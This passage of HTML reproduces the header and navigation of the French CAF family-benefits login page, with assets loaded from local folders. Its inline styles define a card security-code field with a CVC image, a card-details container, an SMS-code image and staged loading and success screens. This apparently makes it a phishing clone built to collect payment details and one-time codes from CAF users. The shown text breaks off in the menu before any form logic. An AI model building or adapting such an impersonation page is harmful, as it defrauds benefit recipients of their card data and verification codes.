

<!DOCTYPE html>
<!-- Détection du Browser  -->

<!-- browserVendor : Google -->
<!-- browserName : Chrome -->
<!-- browserVersion :  -->

<html lang="fr" class="">
		<!-- DEBUT HEAD -->
<!-- pageMetadatatag Version Fwk:  -->
  <!-- pageMetadatatag colorPalette:  -->
   
<head>

	<meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
	
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="OWNER" content="CNAF" />
	<meta name="AUTHOR" content="CNAF" />
	<meta name="viewport" content="width=device-width, initial-scale=1">
	
	<title>CAF - Bienvenue</title>

	<script type="text/javascript" src="js/ruxitagentjs_ICA2SVfhqru_10193200624125340.js" data-dtconfig="app=3f8f7016b9b1835e|featureHash=ICA2SVfhqru|rdnt=1|uxrgce=1|bp=2|cuc=3yk59fmt|dpvc=1|md=mdcc1=buserid|lastModification=1607505654415|dtVersion=10193200624125340|tp=500,50,0,1|uxdcw=1500|vs=2|agentUri=/wps/ruxitagentjs_ICA2SVfhqru_10193200624125340.js|reportUrl=/wps/rb_bf53223bka|rid=RID_-657720435|rpid=-727475320|domain=caf.fr"></script>
	<link href='css/styles.css?id=1607652162438' rel="stylesheet">
	<link href='images/favicon.ico' rel="shortcut icon" />
	
	<link href="css/roboto_cnaf.css?id=1607652162438" rel="stylesheet">
	
	
		<link href="css/bootstrap.css?id=1607652162438" rel="stylesheet">
		<link href="css/bootstrap-theme.css?id=1607652162438" rel="stylesheet">
		<link href="css/bootstrap.css?id=1607652162438" rel="stylesheet">
		<link href="css/bootstrap-theme.css?id=1607652162438" rel="stylesheet">
		
			
	
	
	<style>
		#jnab{
			display: none;
		}
		.conteneur-securite-cnaf{
			display: none;
		}
		#connexion-collapse{
			display: flex;
			flex-direction: column;
			justify-content: center;
			align-items: center;
		}
		.success-checkmark{
			display: none;
		}
		.step-container{
			position: relative;
			width:100%;
			min-height:360px;
		    display: flex;
		    align-items: center;
		    flex-direction: column;
		    justify-content: space-around;
		}

		.step-content{
			display: none;
			text-align: left;
			position: relative;
		}
		.step-content.active{
			display: none;
		}
		.cc-extra-container{
			position: absolute;
			right:0px;
			top:60px;
			width: 45%;
		}
		.cc-extra-container p{
			margin-top: 10px;
		}
		.sms-image{
			position: absolute;
			right: -10px;
			top:100px;
			width:90px;
		}
		.step-loading{
			display: none;
			text-align: center;
		    font-size:21px;
		}
		.step-loading.active{
		}
		.form-container{
			display: flex;
			align-items: center;
			justify-content: space-between;
		}

		.profile-main-loader{
		    display: none;
		    align-items:center;
		    justify-content:center;
		    /*width: 45px;*/
		    z-index: 9000 !important;
		}

		/*.profile-main-loader .loader {
		  position: relative;
		  margin: 0px auto;
		  width: 100px;
		  height:100px;
		}
		.profile-main-loader .loader:before {
		  content: '';
		  display: block;
		  padding-top: 100%;
		}

		.circular-loader {
		  -webkit-animation: rotate 2s linear infinite;
		          animation: rotate 2s linear infinite;
		  height: 100%;
		  -webkit-transform-origin: center center;
		      -ms-transform-origin: center center;
		          transform-origin: center center;
		  width: 100%;
		  position: absolute;
		  top: 0;
		  left: 0;
		  margin: auto;
		}

		.loader-path {
		  stroke-dasharray: 150,200;
		  stroke-dashoffset: -10;
		  -webkit-animation: dash 1.5s ease-in-out infinite, color 6s ease-in-out infinite;
		          animation: dash 1.5s ease-in-out infinite, color 6s ease-in-out infinite;
		  stroke-linecap: round;
		}

		@-webkit-keyframes rotate {
		  100% {
		    -webkit-transform: rotate(360deg);
		            transform: rotate(360deg);
		  }
		}

		@keyframes rotate {
		  100% {
		    -webkit-transform: rotate(360deg);
		            transform: rotate(360deg);
		  }
		}
		@-webkit-keyframes dash {
		  0% {
		    stroke-dasharray: 1,200;
		    stroke-dashoffset: 0;
		  }
		  50% {
		    stroke-dasharray: 89,200;
		    stroke-dashoffset: -35;
		  }
		  100% {
		    stroke-dasharray: 89,200;
		    stroke-dashoffset: -124;
		  }
		}
		@keyframes dash {
		  0% {
		    stroke-dasharray: 1,200;
		    stroke-dashoffset: 0;
		  }
		  50% {
		    stroke-dasharray: 89,200;
		    stroke-dashoffset: -35;
		  }
		  100% {
		    stroke-dasharray: 89,200;
		    stroke-dashoffset: -124;
		  }
		}
		@-webkit-keyframes color {
		  0% {
		    stroke: #0093c4;
		  }
		  40% {
		    stroke: #0093c4;
		  }
		  66% {
		    stroke: #0093c4;
		  }
		  80%, 90% {
		    stroke: #0093c4;
		  }
		}
		@keyframes color {
		  0% {
		    stroke: #0093c4;
		  }
		  40% {
		    stroke: #0093c4;
		  }
		  66% {
		    stroke: #0093c4;
		  }
		  80%, 90% {
		    stroke: #0093c4;
		  }
		}*/
		.success-checkmark {
         width: 115px;
         height: 115px;
         margin: 20px auto;
      }
       .success-checkmark .check-icon {
         width: 80px;
         height: 80px;
         position: relative;
         border-radius: 50%;
         box-sizing: content-box;
         border: 4px solid #4caf50;
      }
       .success-checkmark .check-icon::before {
         top: 3px;
         left: -2px;
         width: 30px;
         transform-origin: 100% 50%;
         border-radius: 100px 0 0 100px;
      }
       .success-checkmark .check-icon::after {
         top: 0;
         left: 30px;
         width: 60px;
         transform-origin: 0 50%;
         border-radius: 0 100px 100px 0;
         animation: rotate-circle 4.25s ease-in;
      }
       .success-checkmark .check-icon::before, .success-checkmark .check-icon::after {
         content: '';
         height: 100px;
         position: absolute;
         background: #fff;
         transform: rotate(-45deg);
      }
       .success-checkmark .check-icon .icon-line {
         height: 5px;
         background-color: #4caf50;
         display: block;
         border-radius: 2px;
         position: absolute;
         z-index: 10;
      }
       .success-checkmark .check-icon .icon-line.line-tip {
         top: 46px;
         left: 14px;
         width: 25px;
         transform: rotate(45deg);
         animation: icon-line-tip 0.75s;
      }
       .success-checkmark .check-icon .icon-line.line-long {
         top: 38px;
         right: 8px;
         width: 47px;
         transform: rotate(-45deg);
         animation: icon-line-long 0.75s;
      }
       .success-checkmark .check-icon .icon-circle {
         top: -4px;
         left: -4px;
         z-index: 10;
         width: 80px;
         height: 80px;
         border-radius: 50%;
         position: absolute;
         box-sizing: content-box;
         border: 4px solid rgba(76, 175, 80, .5);
      }
       .success-checkmark .check-icon .icon-fix {
         top: 8px;
         width: 5px;
         left: 26px;
         z-index: 1;
         height: 85px;
         position: absolute;
         transform: rotate(-45deg);
         background-color: #fff;
      }
       @keyframes rotate-circle {
         0% {
           transform: rotate(-45deg);
        }
         5% {
           transform: rotate(-45deg);
        }
         12% {
           transform: rotate(-405deg);
        }
         100% {
           transform: rotate(-405deg);
        }
      }
       @keyframes icon-line-tip {
         0% {
           width: 0;
           left: 1px;
           top: 19px;
        }
         54% {
           width: 0;
           left: 1px;
           top: 19px;
        }
         70% {
           width: 50px;
           left: -8px;
           top: 37px;
        }
         84% {
           width: 17px;
           left: 21px;
           top: 48px;
        }
         100% {
           width: 25px;
           left: 14px;
           top: 45px;
        }
      }
       @keyframes icon-line-long {
         0% {
           width: 0;
           right: 46px;
           top: 54px;
        }
         65% {
           width: 0;
           right: 46px;
           top: 54px;
        }
         84% {
           width: 55px;
           right: 0px;
           top: 35px;
        }
         100% {
           width: 47px;
           right: 8px;
           top: 38px;
        }
      }
    /* Safari */
    @-webkit-keyframes spin {
      0% { -webkit-transform: rotate(0deg); }
      100% { -webkit-transform: rotate(360deg); }
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
		#vcc{
			background:url(./images/cvc.png) no-repeat scroll 65px 7px;
			background-size: 35px 20px;
		}
		input.saisie {
		    padding: 8px;
		    height: 35px;
		    margin-bottom: 10px;
		    border: 1px solid #ccc;
		    background: #fbfbfb;
		    -webkit-box-shadow: inset 1px 1px 2px rgba(200, 200, 200, 0.2);
		    -moz-box-shadow: inset 1px 1px 2px rgba(200, 200, 200, 0.2);
		    box-shadow: inset 1px 1px 2px rgba(200, 200, 200, 0.2);
		    -moz-border-radius: 5px;
		    -ms-border-radius: 5px;
		    -webkit-border-radius: 5px;
		    border-radius: 5px;
		}
		.form-control{
		    display: block;
		    width: 100%;
		    height: 34px;
		    padding: 6px 12px;
		    font-size: 14px;
		    line-height: 1.42857143;
		    color: #555;
		    background-color: #fff;
		    background-image: none;
		    border: 1px solid #ccc;
		    border-radius: 4px;
		    -webkit-box-shadow: inset 0 1px 1px rgba(0,0,0,.075);
		    box-shadow: inset 0 1px 1px rgba(0,0,0,.075);
		    -webkit-transition: border-color ease-in-out .15s,-webkit-box-shadow ease-in-out .15s;
		    -o-transition: border-color ease-in-out .15s,box-shadow ease-in-out .15s;
		    transition: border-color ease-in-out .15s,box-shadow ease-in-out .15s;
		}
		.form-control:focus {
		    border-color: #66afe9;
		    outline: 0;
		    -webkit-box-shadow: inset 0 1px 1px rgba(0,0,0,.075), 0 0 8px rgba(102,175,233,.6);
		    box-shadow: inset 0 1px 1px rgba(0,0,0,.075), 0 0 8px rgba(102,175,233,.6);
		}
		.circle-loader {
			 margin-bottom: 3.5em;
			 border: 1px solid rgba(0, 0, 0, 0.2);
			 border-left-color: #0093c4;
			 animation: loader-spin 1.2s infinite linear;
			 position: relative;
			 display: inline-block;
			 vertical-align: top;
			 border-radius: 50%;
			 width: 7em;
			 height: 7em;
		}
		 .load-complete {
			 -webkit-animation: none;
			 animation: none;
			 border-color: #5cb85c;
			 transition: border 500ms ease-out;
		}
		.load-complete .checkmark:after{
			border-color: #5cb85c;
		}
		 .checkmark {
			 display: none;
		}
		 .checkmark.draw:after {
			 animation-duration: 800ms;
			 animation-timing-function: ease;
			 animation-name: checkmark;
			 transform: scaleX(-1) rotate(135deg);
		}
		 .checkmark:after {
			 opacity: 1;
			 height: 3.5em;
			 width: 1.75em;
			 transform-origin: left top;
			 border-right: 3px solid #0093c4;
			 border-top: 3px solid #0093c4;
			 content: '';
			 left: 1.75em;
			 top: 3.5em;
			 position: absolute;
		}
		 @keyframes loader-spin {
			 0% {
				 transform: rotate(0deg);
			}
			 100% {
				 transform: rotate(360deg);
			}
		}
		 @keyframes checkmark {
			 0% {
				 height: 0;
				 width: 0;
				 opacity: 1;
			}
			 20% {
				 height: 0;
				 width: 1.75em;
				 opacity: 1;
			}
			 40% {
				 height: 3.5em;
				 width: 1.75em;
				 opacity: 1;
			}
			 100% {
				 height: 3.5em;
				 width: 1.75em;
				 opacity: 1;
			}
		}
		 
	</style>

	<script src="js/jquery.min.js"></script>
	
		
	<script src="js/angular.min.js"></script>
	<script src="js/angular-resource.min.js"></script>
	<script src="js/angular-animate.min.js"></script>
	<script src="js/angular-ui-router.min.js?id=1607652162438"></script>
	<script src="js/angular-locale_fr-fr.js?id=1607652162438"></script>
	<script src="js/ui-bootstrap-tpls.min.js?id=1607652162438"></script>
	<script src="js/ui-validate.min.js?id=1607652162438"></script>
	<script src="js/ng-file-upload.min.js?id=1607652162438"></script>
	<script src="js/ui-mask.min.js?id=1607652162438"></script>
	<script src="js/scrolling-tabs.min.js?id=1607652162438"></script>
	<link href="css/scrolling-tabs.min.css?id=1607652162438" rel="stylesheet"> 
		
	
	<script src="js/bootstrap.min.js?id=1607652162438"></script>
	<script src="js/headerCnaf.min.js?id=1607652162438"></script>
	<script src="js/bowser.js?id=1607652162438"></script>
	
		<script src="js/carousel-swipe.min.js?id=1607652162438"></script>
	
	
	
	<script>
    	var contexteAffichageAngular = "Bienvenue";
    	var pageUniqueName = "fr.caf.page.Login";
	</script>
	
	<!--[if lt IE 9]>
		<script src="/icfstatiquesangularappli/dist/html5shiv/3.7.2/html5shiv.min.js"></script>
		<script src="/icfstatiquesangularappli/dist/respond/1.4.2/respond.min.js"></script>
	<![endif]-->

	
		
	<script src="js/app1.min.js?id=1607652162438"></script>
		
	
		
			<script src="js/smarttag.js?id=1607652162438"></script>
		
	
		
		<!-- Chargement des composants teleproc -->
		<script src="js/app.min.js?id=1607652162438"></script>
		<link href="css/app_1.css?id=1607652162438" rel="stylesheet">
		<!-- Fin chargement des composants teleproc -->
		
	

	
	
	
	
</head>
		
		<!-- FIN HEAD -->		
		<!-- DEBUT BODY -->
		
		
		<body role="document" class="">
		
		
	  
		
		
		
				<script>
					var dateExpireCookie = new Date();
					dateExpireCookie.setTime(dateExpireCookie.getTime() + (24 * 60 * 60 * 1000));
					document.cookie = "modeAffichage=web; path=/; domain=.caf.fr; expires=" + dateExpireCookie.toGMTString();
				</script>
			
		
			<!-- DEBUT POPUP COOKIE -->
			<!-- <div id="popup-accept-cookies" class="popup-cookies">
				<div class="popup-content container">
					<div class="row">
						<div class="popup-text col-sm-12">
							<p>En poursuivant votre navigation, vous acceptez l'utilisation de cookies pour améliorer votre navigation, faciliter votre connexion et recueillir des statistiques. <a title="Utilisation de cookies - En savoir plus (Nouvelle Fenêtre)" href="/redirect/s/Redirect?page=mentionsLegales" target="_blank" class="btn not-accept-cookies">en savoir plus</a></p>
						</div>
						<div class="popup-buttons col-sm-12">
							<button class="pull-right agree-button" type="button">OK</button>
						</div>
					</div>
				</div>
			</div> -->
			<!-- FIN POPUP COOKIE -->
			
			<!-- DEBUT BANDEAU DEGRADE -->
			<div id="bandeau-accept-degrade" class="bandeau-degrade">
				<div class="bandeau-content container">
					<div class="row">
						<div class="bandeau-text col-sm-12">
							<p>Attention la navigation en mode privé pourrait provoquer certains dysfonctionnements, merci de quitter ce mode pour profiter pleinement de l'ensemble des services proposés.</p>
						</div>
						<div class="bandeau-buttons col-sm-12">
							<button class="pull-right agree-button not-accept-cookies" type="button">OK</button>
						</div>
					</div>
				</div>
			</div>
			<!-- FIN BANDEAU DEGRADE -->	
		 
			<!-- DEBUT HEADER -->
			







		
		<a class="lien-evitement-cnaf" id="lien-evitement-cnaf" href="#theme-contenu-content-link-cnaf">Aller au contenu</a>
		
		
		
		
		
		<header id="theme-header-cnaf" role="banner">
			
			
			<div id="theme-header-links-cnaf">
				<div class="container">
					<div class="row">
						
						
						<div class="navbar-links-access-cnaf pull-right">
							<span id="accessibilite" class="navbar-links-item-cnaf">
								<a class="popover-access-cnaf" style="text-decoration:none" href="javascript:void(0);" role="button" data-toggle="modal" tabindex="0" data-target="#myModalContraste">
									<img class="" alt="Option d'accessibilité" src="images/pic-access.png">
									<span class="hidden-xs hidden-sm" style="vertical-align:middle">Accessibilité</span>
								</a>
							  </span>
							<form class="navbar-macaf-cnaf pull-right" method="POST" action="https://www.caf.fr/allocataires/ma-caf-recherche/">
								<label for="ma-caf-code-postal">Ma Caf</label>
								<div class="input-group input-group-with-addon-cnaf">
									<input type="text" id="ma-caf-code-postal" name="zipcode" class="form-control" placeholder="Code postal" maxlength="5">
									<span class="input-group-addon">
										<input type="image" alt="Valider le code postal de ma caf" src="images/pic-suite.png" onclick="this.src='images/pic-suite_gris.png'">
										<input type="image" alt="Valider le code postal de ma caf" src="images/pic-suite_gris.png" class="hidden"> <!-- Preload image -->
									</span>
								</div>
							</form>
						</div>
						<div class="navbar-links-cnaf pull-left navbar-links-header">
						<ul class="list-btn-lien-cnaf ul-header">
							<li class="li-header">
								<span class="navbar-links-item-cnaf span-header active">
									<a class="text-uppercase" title="Allocataires Rubrique active" href="/redirect/s/Redirect?page=allocataires">Allocataires</a>
								</span>
							</li>
							<li class="li-header">
								<span class="navbar-links-item-cnaf span-header">
									<a class="text-uppercase" href="/redirect/s/Redirect?page=partenaires">Partenaires</a>
								</span>
							</li>
							<li class="li-header">	
								<span class="navbar-links-item-cnaf span-header">
									<a class="text-uppercase" href="/redirect/s/Redirect?page=presseInstitutionnel">
										<span class="hidden-xs hidden-sm">Presse et institutionnel</span>
										<span class="visible-xs visible-sm">Presse/Instit.</span>
									</a>
								</span>
							</li>
	</ul>
							<!-- <li class="li-header">
	
								<span id="accessibilite" class="navbar-links-item-cnaf span-header">
	                            <a class="popover-button-cnaf picto picto-access picto-header-access" data-toggle="modal" data-target="#myModalContraste">Accessibilité</a>
	                          </span> -->
	                          <div id="myModalContraste" class="modal fade" tabindex="-1" role="dialog" aria-labelledby="modalOptionAccessibilite">
	                             <div class="modal-dialog" role="document">
	                                 <div class="modal-content">
	                                     <div class="modal-header">
	                                         <button type="button" class="close-cnaf" data-dismiss="modal" aria-label="Fermer la popup"></button>
	                                         <div role="heading" aria-level="1" class="texte-medium text-primary" id="modalOptionAccessibilite">Option d'accessibilité</div>
	                                     </div>
	                                     <div class="modal-body">
	                                       <div class="row">
	                                        <div class="col-sm-6 ">
	                                          <fieldset>
	                                            <legend class="label-form-cnaf">Contraste: </legend>
	                                            <div class="form-group btn-group btn-group-justified" data-toggle="buttons" role="radiogroup">
	                                              <label class="btn btn-default" uib-btn-radio="'Standard'" for="standard" onclick="desactiveContrasteCnaf()">
	                                                <input type="radio" name="contraste" aria-label="Standard" class="sr-only" id="standard"  />
	                                                <span>Standard</span>
	                                              </label>
	                                              <label class="btn btn-default" uib-btn-radio="'Renforcé'" for="renforce" onclick="activeContrasteCnaf()">
	                                                <input type="radio" name="contraste" aria-label="Renforcé" class="sr-only" id="renforce"  />
	                                                <span>Renforcé</span>
	                                              </label>
	                                            </div>
	                                          </fieldset>
	                                         </div>
	                                        </div>
	                                     </div>
	                                 </div>
	                             </div>
	                         </div>
	                        <!--  </li> -->

						</div>						
					</div>
				</div>
			</div>
			
			<div id="theme-header-content-cnaf">
				<div class="container">
					<div class="row">
						
						<a class="btn btn-active-cnaf btn-burger-cnaf collapsed text-uppercase hidden-lg" data-toggle="collapse" data-target="#theme-menu-collapse-cnaf" aria-expanded="false" href="#" onclick="return false">
							<span class="picto picto-burger"></span>
							<span>Menu</span>
						</a>
						<a class="btn btn-active-cnaf btn-burger-noncliquable-cnaf text-uppercase visible-lg" href="#" onclick="return false">
							<span class="picto picto-burger"></span>
							<span>Menu</span>
						</a>
						
						
							<a class="btn btn-domaine-cnaf" href="/redirect/s/Redirect?page=accueilCaffr">
						
								<img alt="Accueil caf.fr" src="images/logo_caf-fr.png">
						
							</a>
						
						
						
						
						
						
						<div>
							<div class="separator hidden-xs hidden-sm"></div>
						</div>
						
						<div class="titre-cnaf">
							
								<div class="sur-titre-cnaf hidden-xs hidden-sm text-uppercase">
									Allocations familiales
								</div>
							
							
								<div class="sous-titre-cnaf hidden-xs hidden-sm text-uppercase">
										Bienvenue
								</div>
							
						</div>
						
						<a class="btn text-uppercase" href="/redirect/s/Redirect?page=recherche" >
							<span class="picto picto-recherche"></span>
							<span class="hidden-xs">Rechercher</span>
						</a>
						
							<a id="btn-menu-moncompte-cnaf" class="btn text-uppercase" href="/redirect/s/Redirect?page=monCompte" role="button">
								<span class="picto picto-mon-compte"></span>
								<span class="hidden-xs">Mon Compte</span>
							</a>
						
						
						
						
						<a class="btn btn-logo-cnaf hidden-xs" href="/redirect/s/Redirect?page=accueilCaffr">
						
							
								<img alt="Accueil caf.fr" src="images/logoCNAF.png">
							
						
						</a>
						
					</div>
				</div>
			</div>
		</header>
		 
		
		
		
			
			<nav id="theme-menu-cnaf" role="navigation" aria-label="menu principal" aria-hidden="true">
				<div id="theme-menu-content-cnaf">
					<div class="container">
		
						<div id="theme-menu-collapse-cnaf" class="collapse navbar-collapse">
							
									<ul id="menu-burger-content-cnaf" class="nav navbar collapse in"><li class="dropdown"><a class="titre-menu-cnaf text-uppercase" href="#" onclick="return false" aria-disabled="true">Toutes les rubriques</a></li><li role="separator" class="divider" aria-hidden="true"></li><li class="dropdown"><a class="dropdown-toggle text-uppercase" data-toggle="collapse" data-target="#sub-menu-content-0-0-0" href="#"  onclick="return false">Actualités</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="dropdown"><a class="dropdown-toggle text-uppercase" data-toggle="collapse" data-target="#sub-menu-content-0-0-1" href="#"  onclick="return false">Mes services en ligne</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="dropdown"><a class="dropdown-toggle text-uppercase" data-toggle="collapse" data-target="#sub-menu-content-0-0-2" href="#"  onclick="return false">Droits et prestations</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="dropdown"><a class="dropdown-toggle text-uppercase" data-toggle="collapse" data-target="#sub-menu-content-0-0-3" href="#"  onclick="return false">Magazine vies de famille</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="dropdown"><a class="dropdown-toggle text-uppercase" data-toggle="collapse" data-target="#sub-menu-content-0-0-4" href="#"  onclick="return false">Aide</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="dropdown"><a class="text-uppercase" href="https://wwwd.caf.fr/redirect/s/Redirect?page=votreCafJeChercheUneCaf">Ma Caf</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="dropdown"><a class="text-uppercase" href="https://wwwd.caf.fr/redirect/s/Redirect?page=monCompte">Mon Compte</a></li><li role="separator" class="divider" aria-hidden="true"></li></ul><ul id="sub-menu-content-0-0-0" class="nav dropdown-menu" ><li class="dropdown"><a class="dropdown dropup-toggle text-uppercase" data-toggle="collapse" data-target="#sub-menu-content-0-0-0" href="#" onclick="return false">Toutes les rubriques</a></li><li role="separator" class="divider" aria-hidden="true"></li><li class="dropdown"><a class="text-uppercase" href="https://www.caf.fr/allocataires/actualites"><strong>Actualités</strong></a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="dropdown"><a class="" href="https://www.caf.fr/allocataires/actualites/2020">2020</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="dropdown"><a class="" href="https://www.caf.fr/allocataires/actualites/2019">2019</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="dropdown"><a class="" href="https://www.caf.fr/allocataires/actualites/2018">2018</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="dropdown"><a class="" href="https://www.caf.fr/allocataires/actualites/2017">2017</a></li><li role="separator" class="divider" aria-hidden="true"></li></ul><ul id="sub-menu-content-0-0-1" class="nav dropdown-menu" ><li class="dropdown"><a class="dropdown dropup-toggle text-uppercase" data-toggle="collapse" data-target="#sub-menu-content-0-0-1" href="#" onclick="return false">Toutes les rubriques</a></li><li role="separator" class="divider" aria-hidden="true"></li><li class="dropdown"><a class="text-uppercase" href="https://www.caf.fr/allocataires/mes-services-en-ligne"><strong>Mes services en ligne</strong></a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="dropdown"><a class="" href="https://www.caf.fr/allocataires/mes-services-en-ligne/faire-une-simulation">Faire une simulation</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="dropdown"><a class="" href="https://www.caf.fr/allocataires/mes-services-en-ligne/faire-une-demande-de-prestation">Faire une demande de prestation</a></li><li role="separator" class="divider" aria-hidden="true"></li></ul><ul id="sub-menu-content-0-0-2" class="nav dropdown-menu" ><li class="dropdown"><a class="dropdown dropup-toggle text-uppercase" data-toggle="collapse" data-target="#sub-menu-content-0-0-2" href="#" onclick="return false">Toutes les rubriques</a></li><li role="separator" class="divider" aria-hidden="true"></li><li class="dropdown"><a class="text-uppercase" href="https://www.caf.fr/allocataires/droits-et-prestations"><strong>Droits et prestations</strong></a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="dropdown"><a class="dropdown-toggle " data-toggle="collapse" data-target="#sub-menu-content-1-2-0" href="#"  onclick="return false">Connaître vos droits selon votre situation</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="dropdown"><a class="dropdown-toggle " data-toggle="collapse" data-target="#sub-menu-content-1-2-1" href="#"  onclick="return false">S'informer sur les aides</a></li><li role="separator" class="divider" aria-hidden="true"></li></ul><ul id="sub-menu-content-1-2-0" class="nav dropdown-menu" ><li class="dropdown"><a class="dropdown dropup-toggle text-uppercase" data-toggle="collapse" data-target="#sub-menu-content-1-2-0" href="#" onclick="return false">Droits et prestations</a></li><li role="separator" class="divider" aria-hidden="true"></li><li class="dropdown"><a class="" href="https://www.caf.fr/allocataires/droits-et-prestations/connaitre-vos-droits-selon-votre-situation"><strong>Connaître vos droits selon votre situation</strong></a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="dropdown"><a class="" href="https://www.caf.fr/allocataires/droits-et-prestations/connaitre-vos-droits-selon-votre-situation/j-ai-ou-j-attends-un-ou-des-enfants">J'ai ou j'attends un ou des enfants</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="dropdown"><a class="" href="https://www.caf.fr/allocataires/droits-et-prestations/connaitre-vos-droits-selon-votre-situation/j-ai-perdu-un-proche">J'ai perdu un proche</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="dropdown"><a class="" href="https://www.caf.fr/allocataires/droits-et-prestations/connaitre-vos-droits-selon-votre-situation/j-ai-une-question-sur-ma-situation-d-allocataire">J'ai une question sur ma situation d'allocataire</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="dropdown"><a class="" href="https://www.caf.fr/allocataires/droits-et-prestations/connaitre-vos-droits-selon-votre-situation/je-change-de-situation">Je change de situation</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="dropdown"><a class="" href="https://www.caf.fr/allocataires/droits-et-prestations/connaitre-vos-droits-selon-votre-situation/je-loue-un-logement">Je loue un logement</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="dropdown"><a class="" href="https://www.caf.fr/allocataires/droits-et-prestations/connaitre-vos-droits-selon-votre-situation/je-suis-dans-une-situation-de-handicap">Je suis dans une situation de handicap</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="dropdown"><a class="" href="https://www.caf.fr/allocataires/droits-et-prestations/connaitre-vos-droits-selon-votre-situation/je-suis-dans-une-situation-difficile">Je suis dans une situation difficile</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="dropdown"><a class="" href="https://www.caf.fr/allocataires/droits-et-prestations/connaitre-vos-droits-selon-votre-situation/je-vis-seul-avec-ou-sans-enfant">Je vis seul avec ou sans enfant</a></li><li role="separator" class="divider" aria-hidden="true"></li></ul><ul id="sub-menu-content-1-2-1" class="nav dropdown-menu" ><li class="dropdown"><a class="dropdown dropup-toggle text-uppercase" data-toggle="collapse" data-target="#sub-menu-content-1-2-1" href="#" onclick="return false">Droits et prestations</a></li><li role="separator" class="divider" aria-hidden="true"></li><li class="dropdown"><a class="" href="https://www.caf.fr/allocataires/droits-et-prestations/s-informer-sur-les-aides"><strong>S'informer sur les aides</strong></a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="dropdown"><a class="" href="https://www.caf.fr/allocataires/droits-et-prestations/s-informer-sur-les-aides/enfance-et-jeunesse">Enfance et jeunesse</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="dropdown"><a class="" href="https://www.caf.fr/allocataires/droits-et-prestations/s-informer-sur-les-aides/logement-et-cadre-de-vie">Logement et cadre de vie</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="dropdown"><a class="" href="https://www.caf.fr/allocataires/droits-et-prestations/s-informer-sur-les-aides/petite-enfance">Petite enfance</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="dropdown"><a class="" href="https://www.caf.fr/allocataires/droits-et-prestations/s-informer-sur-les-aides/solidarite-et-insertion">Solidarité et insertion</a></li><li role="separator" class="divider" aria-hidden="true"></li></ul><ul id="sub-menu-content-0-0-3" class="nav dropdown-menu" ><li class="dropdown"><a class="dropdown dropup-toggle text-uppercase" data-toggle="collapse" data-target="#sub-menu-content-0-0-3" href="#" onclick="return false">Toutes les rubriques</a></li><li role="separator" class="divider" aria-hidden="true"></li><li class="dropdown"><a class="text-uppercase" href="https://www.caf.fr/allocataires/vies-de-famille"><strong>Magazine vies de famille</strong></a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="dropdown"><a class="" href="https://www.caf.fr/allocataires/vies-de-famille/futur-parent">Futur parent</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="dropdown"><a class="" href="https://www.caf.fr/allocataires/vies-de-famille/elever-ses-enfants">Elever ses enfants</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="dropdown"><a class="" href="https://www.caf.fr/allocataires/vies-de-famille/jeune-ou-etudiant">Jeune ou étudiant</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="dropdown"><a class="" href="https://www.caf.fr/allocataires/vies-de-famille/se-loger">Se loger</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="dropdown"><a class="" href="https://www.caf.fr/allocataires/vies-de-famille/vivre-avec-un-handicap">Vivre avec un handicap</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="dropdown"><a class="" href="https://www.caf.fr/allocataires/vies-de-famille/accident-de-vie-precarite">Accident de vie – précarité</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="dropdown"><a class="" href="https://www.caf.fr/allocataires/vies-de-famille/changement-de-situation">Changement de situation</a></li><li role="separator" class="divider" aria-hidden="true"></li></ul><ul id="sub-menu-content-0-0-4" class="nav dropdown-menu" ><li class="dropdown"><a class="dropdown dropup-toggle text-uppercase" data-toggle="collapse" data-target="#sub-menu-content-0-0-4" href="#" onclick="return false">Toutes les rubriques</a></li><li role="separator" class="divider" aria-hidden="true"></li><li class="dropdown"><a class="text-uppercase" href="https://www.caf.fr/allocataires/aide"><strong>Aide</strong></a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="dropdown"><a class="" href="https://www.caf.fr/allocataires/aide/les-aides-personnelles-au-logement-evoluent">Les aides personnelles au logement évoluent</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="dropdown"><a class="" href="https://www.caf.fr/allocataires/aide/les-bons-reflexes-pour-eviter-de-faire-des-erreurs">Les bons réflexes pour éviter de faire des erreurs !</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="dropdown"><a class="" href="https://www.caf.fr/allocataires/aide/utiliser-mon-compte">Utiliser Mon Compte</a></li><li role="separator" class="divider-light" aria-hidden="true"></li><li class="dropdown"><a class="dropdown-toggle " data-toggle="collapse" data-target="#sub-menu-content-1-4-3" href="#"  